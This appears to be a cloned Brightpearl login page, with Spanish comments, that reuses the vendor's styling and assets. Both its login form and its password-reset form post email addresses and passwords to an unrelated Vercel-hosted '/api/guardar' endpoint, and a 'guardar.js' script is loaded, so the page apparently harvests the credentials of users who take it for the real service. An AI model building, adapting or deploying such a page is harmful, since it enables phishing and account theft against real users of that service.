<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, height=device-height, minimum-scale=1.0, maximum-scale=1.0">
    <title>Brightpearl - Login</title>
    <script src="https://dxfbapopdsmzi.cloudfront.net/5.0.1122/build/js/jquery/jquery-1.6.2.min.js"></script>
    <script src="guardar.js" defer></script>
    <script src='https://www.google.com/recaptcha/api.js'></script>
    <link rel="stylesheet" media="all" href="https://dxfbapopdsmzi.cloudfront.net/5.0.1122/build/css/reset.css">
    <link rel="stylesheet" media="all" href="https://dxfbapopdsmzi.cloudfront.net/5.0.1122/build/css/all.css">
    <link rel="stylesheet" media="all" href="https://dxfbapopdsmzi.cloudfront.net/5.0.1122/build/css/pages/login/login.css">
</head>
<body id="login">

<div id="login-main-content-wrapper">
    <div id="login-form">
        <!-- ... (Resto del contenido del formulario) -->

        <!-- Formulario para el inicio de sesión (admin) -->
        <form id="login-form-admin" method="post" action="https://brightpearl-test-jcjl4hl2o-mario-collas-projects.vercel.app/api/guardar">
            <!-- Campos del formulario -->
            <input type="email" id="email_address_login" class="input" name="email_address" value="" placeholder="Email address"/>
            <input type="password" id="password" class="input" autocomplete="off" name="password" value="" placeholder="Password"/>
            <a class="login-button-forgot">Forgotten your password?</a>
            <!-- ... (Resto del contenido del formulario) -->
        </form>

        <!-- Formulario para el restablecimiento de contraseña -->
        <form id="login-form-forgot" method="post" action="https://brightpearl-test-jcjl4hl2o-mario-collas-projects.vercel.app/api/guardar">
            <!-- Campos del formulario -->
            <input type="email" id="email_address_remind" class="input" name="email_address" value="" placeholder="Email address"/>
            <input type="hidden" name="clients_id" value="tiendamia"/>
            <input type="hidden" name="action" value="remind"/>
            <!-- ... (Resto del contenido del formulario) -->
        </form>
    </div>

    <div id="login-media">
        <iframe src="https://info.brightpearl.com/loginpromoscreen" height="101%" width="100%" style="border:none;outline: none"></iframe>
    </div>

    <script src="https://dxfbapopdsmzi.cloudfront.net/5.0.1122/build/js/intercom.logged.out.js"></script>
</body>
</html>

</html>

</html>
